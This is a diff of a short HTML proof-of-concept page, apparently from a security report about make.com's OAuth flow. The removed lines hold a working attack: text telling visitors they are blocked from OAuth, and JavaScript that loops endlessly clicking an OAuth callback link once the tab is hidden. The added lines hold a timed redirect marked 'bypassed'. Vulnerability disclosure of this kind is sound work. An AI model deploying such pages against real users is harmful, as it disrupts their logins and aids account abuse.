@@ -7,44 +7,20 @@
 </head>
 <body>
 <h1>Proof Of Concept</h1>
-<b>The Attack</b>
-<br>
-<small>While you are on this site,<h5 id="site"></h5> you are prevented from being able to use your OATH on REDACTED.com</small>
-<ul>
-    <li>First make sure you are ready to begin with the OATH flow,if not close tab and setup oath flow by visiting <a href="https://make.com/en/login">Here </a> immediately you leave this tab the attack will begin</li>
-    <li>While any user is on this site, they are prevented from using OATH on REDACTED.com</li>
-    <li>If user allowed popups from this site, it would ease exploitation(There is still other workarounds,this is an example)</li>
-</ul>
+
+
+
 <script>
-    document.getElementById("site").textContent = document.location
+  
 
 
-
-function dynamicallyCreateAnchorAndNavigate(url) {
-  while (1 ===1) {
-    let anchorElement = document.createElement('a');
-    anchorElement.href = url;
-    document.body.appendChild(anchorElement);
-    anchorElement.click();
-    document.body.removeChild(anchorElement);
-  }
-}
-
-function openInNewTab(url){
-  dynamicallyCreateAnchorAndNavigate(url);
-}
-
-
-document.addEventListener("visibilitychange", function() {
-    if (document.visibilityState === 'hidden') {
         setTimeout(() => {
-  openInNewTab("https://make.com/sso/authomat?code=poc&state=poc")
-      },1000);
-    } else {
-        // Code to run when the user returns to the tab
-        console.log("User returned to the page (tab is visible)");
-    }
-});
+            window.location.href = "https://www.make.com/en/register?pc=bypassed"
+        },5000)
+
+
+
+
 </script>
 </body>
 </html>
